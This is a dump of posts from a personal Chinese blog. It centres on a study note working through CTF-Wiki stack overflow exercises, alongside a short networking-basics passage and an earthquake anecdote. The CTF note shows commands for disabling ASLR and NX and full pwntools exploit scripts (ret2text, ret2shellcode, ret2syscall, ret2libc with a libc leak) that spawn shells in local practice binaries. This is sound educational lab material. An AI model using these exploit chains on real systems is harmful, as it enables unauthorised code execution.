TCP数据报需要设置端口,接收方的HTTP默认端口是80,而发送方的端口是1024-65535之间随机确定的. 假定为51775.TCP数据报的Head长为20字节,加上嵌入HTTP的数据报,总长度变为4980字节.\nIP协议 然后TCP数据报再嵌入IP数据报,IP数据报需要设置双方的IP地址,这是已知的.发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。\nEthernet协议 最后IP数据报嵌入以太网数据报,以太网数据报设置双方的MAC地址,发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。\n以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。\n服务器端响应 经过多个网关转发,Google服务器收到了这四个以太网数据报.根据IP Head的序号,Google将四个包拼接起来,取出完整的TCP数据,根据其中的HTTP请求作出HTTP响应,再用TCP协议发回.本机收到HTTP响应后,就可以将网页显示出来,完成一次网络通信.\n","date":"2020-07-16T15:24:35+08:00","permalink":"https://wander1ng.com/post/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/","section":"post","tags":["技术"],"title":"互联网协议入门"},{"categories":null,"contents":"从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。\n0X01\u0026ndash;栈溢出的基本原理：\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。\n函数调用指令: CALL(注意理解EBP的变化过程，它指向下一条指令要操作的数据)\n大致过程:\n参数入栈 返回地址入栈 代码区块跳转 栈帧调整:\n保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈) 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部) 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶) 0X02\u0026ndash;栈溢出的保护类型：\n知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。\nCanary：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \\x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。编译时的关闭指令：-fno-stack-protector\nALSR与PIE(Position Independent Executable)：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功） 编译时ALSR的关闭指令：echo 0\u0026gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态，可以用cat+路径显示相关的参数： 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。\nPIE编译时的关闭指令：-no-pie，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。\nLinux平台下的NX,Windows平台上的DEP：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。\n0X03\u0026ndash;编译指令：\ngcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie）\nsudo -s echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n($ cat /proc/sys/kernel/randomize_va_space指令检查) exit（关闭ALSR) -z execstack（关闭NX保护）\ntest.c -o test(由test.c生成test可执行文件)\n-g(GDB调试)\n0X04\u0026ndash;ROP原理：\n随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：\n程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ropgadget，注意命令格式：ROPgadget \u0026ndash;binary [文件名] \u0026ndash;only’寄存器名|寄存器名’ | grep ‘eax’。\n0X05\u0026ndash;四种类型：\n第一种类型ret2text:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rvoid success() { puts(“You Hava already controlled it.”); }\rvoid vulnerable()\r{\rchar s[12];\rgets(s);\rputs(s);\rreturn;\r}\rint main(int argc, char **argv) {\rvulnerable();\rreturn 0;\r} 只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。\nEXP如下：\n##coding=utf8\r## 导入pwntools库\rfrom pwn import *\r## 构造与程序交互的对象，sh = process(\u0026#39;./文件名\u0026#39;)表示打本地，日自己。\rsh = process(\u0026#39;./stack_example\u0026#39;)\r## 已知了想要执行的函数地址\rsuccess_addr = 0x0804843b\r## 构造payload\rpayload = \u0026#39;a\u0026#39; * 0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr)\r##print可以帮助自己看脚本执行到了哪一步\rprint p32(success_addr)\r## 向程序发送字符串\rsh.sendline(payload)\r## 将代码交互转换为手工交互\rsh.interactive() int __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(_bss_start, 0, 1, 0);\rputs(\u0026#34;There is something amazing here, do you know anything?\u0026#34;);\rgets((char *)\u0026amp;v4);\rprintf(\u0026#34;Maybe I will tell you next time !\u0026#34;);\rreturn 0;\r} 首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(\u0026quot;/bin/sh\u0026quot;)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。\n.text:080486A7 lea eax, [esp+1Ch]\r.text:080486AB mov [esp], eax ; s\r.text:080486AE call _gets 由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。\ngef➤ b *0x080486AE\rBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\rgef➤ r\rThere is something amazing here, do you know anything?\rBreakpoint 1, 0x080486ae in main () at ret2text.c:24\r24 gets(buf);\r───────────────────────────────────────────────────────────────────────[ registers ]────\r$eax : 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebx : 0x00000000\r$ecx : 0xffffffff\r$edx : 0xf7faf870 → 0x00000000\r$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebp : 0xffffcdc8 → 0x00000000\r$esi : 0xf7fae000 → 0x001b1db0\r$edi : 0xf7fae000 → 0x001b1db0\r$eip : 0x080486ae → \u0026lt;main+102\u0026gt; call 0x8048460 \u0026lt;gets@plt\u0026gt; 断点下在Call处**为什么是这个Call处？**(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。\n每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。\nEXP如下：\n##!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2text\u0026#39;)\rtarget = 0x0804863a\rsh.sendline(\u0026#39;A\u0026#39; * (0x6c+4) + p32(target))\rsh.interactive() 上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。\n第二种类型ret2shellcode：\nret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;No system for you this time !!!\u0026#34;);\rgets((char *)\u0026amp;v4);\rstrncpy(buf2, (const char *)\u0026amp;v4, 0x64u);\rprintf(\u0026#34;bye bye ~\u0026#34;);\rreturn 0;\r} 程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。\n.bss:0804A080 public buf2\r.bss:0804A080 ; char buf2[100] 通过vmmap观察该bss段是否可执行：\ngef➤ b main\rBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\rgef➤ r\rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:8\r8 setvbuf(stdout, 0LL, 2, 0LL);\r─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────\r6 int main(void)\r7 {\r→ 8 setvbuf(stdout, 0LL, 2, 0LL);\r9 setvbuf(stdin, 0LL, 1, 0LL);\r10 ─────────────────────────────────────────────────────────────────────[ trace ]────\r[#0] 0x8048536 → Name: main()\r─────────────────────────────────────────────────────────────────────────────────────────────────────\rgef➤ vmmap Start End Offset Perm Path\r0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\r0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\r0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\r0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\r0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\r0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\r0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\r0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\r0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\r0xfffdd000 0xffffe000 0x00000000 rwx [stack] 所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。\nEXP如下:\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2shellcode\u0026#39;)\r## 自动生成shellcode\rshellcode = asm(shellcraft.sh())\rbuf2_addr = 0x804a080\r## shellcode先放入，剩余的再用\u0026#39;A\u0026#39;填充至112长度。\rsh.sendline(shellcode.ljust(112, \u0026#39;A\u0026#39;) + p32(buf2_addr))\rsh.interactive() 第三种类型：ret2syscall： 即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。\nexecve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 由于该程序是 32 位，所以我们需要使得\n系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。\n具体实现\u0026ndash;ropgadgets 这个工具:\nonly ‘pop|ret’ | grep \u0026rsquo;eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。\n平凡无奇的存在栈溢出漏洞的程序源码如下：\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;This time, no system() and NO SHELLCODE!!!\u0026#34;);\rputs(\u0026#34;What do you plan to do?\u0026#34;);\rgets(\u0026amp;v4);\rreturn 0;\r} 想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。\n此外，我们需要获得 /bin/sh 字符串对应的地址。\n➜ ret2syscall ROPgadget --binary rop --string \u0026#39;/bin/sh\u0026#39; Strings information\r============================================================\r0x080be408 : /bin/sh 以及int 0x80的地址：\n➜ ret2syscall ROPgadget --binary rop --only \u0026#39;int\u0026#39; Gadgets information\r============================================================\r0x08049421 : int 0x80\r0x080938fe : int 0xbb\r0x080869b5 : int 0xf6\r0x0807b4d4 : int 0xfc\rUnique gadgets found: 4 EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./rop\u0026#39;)\r## 找到的gadgets及其地址\rpop_eax_ret = 0x080bb196\rpop_edx_ecx_ebx_ret = 0x0806eb90\rint_0x80 = 0x08049421\rbinsh = 0x80be408\r## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。\rpayload = flat([\u0026#39;A\u0026#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\rsh.sendline(payload)\rsh.interactive() payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。\n第四种类型：ret2libc\nlibc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(\u0026quot;/bin/sh\u0026quot;).\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(_bss_start, 0, 1, 0);\rputs(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;);\rgets((char *)\u0026amp;v4);\rreturn 0;\r} 确定存在栈溢出漏洞,用IDA找到了system函数,用ropgadget查找到\u0026quot;/bin/sh\u0026quot;。\n则EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2libc1\u0026#39;)\rbinsh_addr = 0x8048720\rsystem_plt = 0x08048460\rpayload = flat([\u0026#39;a\u0026#39; * 112, system_plt, \u0026#39;b\u0026#39; * 4, binsh_addr])\rsh.sendline(payload)\rsh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以\u0026rsquo;bbbb\u0026rsquo; 作为虚假的地址，其后参数对应的参数内容。\n当查找不到\u0026quot;/bin/sh\u0026quot;时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。\nEXP如下：\n##!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2libc2\u0026#39;)\rgets_plt = 0x08048460\rsystem_plt = 0x08048490\rpop_ebx = 0x0804843d\rbuf2 = 0x804a080\rpayload = flat([\u0026#39;a\u0026#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\rsh.sendline(payload)\rsh.sendline(\u0026#39;/bin/sh\u0026#39;)\rsh.interactive() 注意payload中的pop_ebx是用来平衡堆栈的。\n同时找不到\u0026quot;/bin/sh\u0026quot;与system()函数地址的情况，用到了两个知识点：\nsystem 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。 所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。\n此外，libc中是一定存在\u0026quot;/bin/sh\u0026quot;的，所以字符串地址也可以获取。这方面工具做的很完善。\n示例：\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;No surprise anymore, system disappeard QQ.\u0026#34;);\rprintf(\u0026#34;Can you find it !?\u0026#34;);\rgets((char *)\u0026amp;v4);\rreturn 0;\r} 思路：\n泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\r## 导入工具\rfrom LibcSearcher import LibcSearcher\r## 本地连接\rsh = process(\u0026#39;./ret2libc3\u0026#39;)\r## 将文件加载入进程\rret2libc3 = ELF(\u0026#39;./ret2libc3\u0026#39;)\r##简化libc库中函数地址的表示方法\rputs_plt = ret2libc3.plt[\u0026#39;puts\u0026#39;]\rlibc_start_main_got = ret2libc3.got[\u0026#39;__libc_start_main\u0026#39;]\rmain = ret2libc3.symbols[\u0026#39;main\u0026#39;]\r## 监视程序进行到哪一步，提醒自己\rprint \u0026#34;leak libc_start_main_got addr and return to main again\u0026#34;\r## puts函数泄露出start_main函数地址\rpayload = flat([\u0026#39;A\u0026#39; * 112, puts_plt, main, libc_start_main_got])\r## 在输出前面字符串后，将payload输入\rsh.sendlineafter(\u0026#39;Can you find it !?\u0026#39;, payload)\rprint \u0026#34;get the related addr\u0026#34;\r##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式\rlibc_start_main_addr = u32(sh.recv()[0:4])\r##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。\rlibc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;, libc_start_main_addr)\r## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。\rlibcbase = libc_start_main_addr - libc.dump(\u0026#39;__libc_start_main\u0026#39;)\r## 已知基地址与相对地址，得到绝对地址\rsystem_addr = libcbase + libc.dump(\u0026#39;system\u0026#39;)\rbinsh_addr = libcbase + libc.dump(\u0026#39;str_bin_sh\u0026#39;)\r## 监视程序进行到哪一步\rprint \u0026#34;get shell\u0026#34;\rpayload = flat([\u0026#39;A\u0026#39; * 104, system_addr, 0xdeadbeef, binsh_addr])\rsh.sendline(payload)\rsh.interactive() 0X05\u0026ndash;稍作总结：\nret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。\n0X06\u0026ndash;MISC:\n1.最简单栈溢出，一套工具解决。\npython pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address)\n即可得到溢出地址\n2.注意是返回地址，不是/bin/sh本身在栈上。\n3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。\n4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。\n5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。\n6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。\n7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。\n8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。\n9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。\n10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。 PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。\n11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分： 1.栈区（stack）：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.堆区（heap)： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回 收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.数据区：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.代码区：存放函数体的二进制代码。\n12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是\n\\x3b\\x84\\x04\\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \\，x 等也算一个单独的字符。。所以我们需要想办法将 \\x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。\n13.常见的危险函数如下\n输入 gets，直接读取一行，忽略\u0026rsquo;\\x00' scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到\u0026rsquo;\\x00\u0026rsquo;停止 strcat，字符串拼接，遇到\u0026rsquo;\\x00\u0026rsquo;停止 bcopy 计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式\n相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求\n覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。\n0X06\u0026ndash;尚存在的问题:\n1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。\n2.ESP的调试为什么断点下在CALL处。\n3.buf两端的问题。\n4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。 解决此问题最简单的方法就是开启core dump功能，即： ulimit -c unlimited sudo sh -c ‘echo “/tmp/core.%t” \u0026gt; /proc/sys/kernel/core_pattern’ 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。\nCTF-Wiki\u0026gt;Linux Pwn:\nStack Overflow principle\nBasic ROP\n系统调用\nGithub上Libc版本库\nLibcSearcher工具\n现代栈溢出利用技术基础：ROP\n一步一步学ROP之linux_x86篇\n一步一步学ROP之linux_x64篇\n手把手教你栈溢出从入门到放弃（上）\n手把手教你栈溢出从入门到放弃（下）\nLinux下pwn从入门到放弃\n","date":"2019-06-20T00:06:21+08:00","permalink":"https://wander1ng.com/post/ctf-wiki/","section":"post","tags":["技术"],"title":"CTF Wiki"},{"categories":null,"contents":"Earthquake and Blog\n第一次建博客的那天晚上，人在学校宿舍，遭遇了人生第一次感到恐慌的地震，震级为6.0级，以至于之后的半年常常在半夜惊醒。\n地震这事，大概就和吃云南野生菌中毒一样，没有必要执着于去经历一次，可是经历过一次真的永生难忘\u0026hellip;\n又想到《西游记》中齐天大圣也是从一块灵石降世，这地震大抵也是我的博客第一声“Hello World\u0026quot;引发的天地异象~\n","date":"2019-06-19T02:56:00+08:00","permalink":"https://wander1ng.com/post/gensis/","section":"post","tags":["Meta"],"title":"Gensis"}]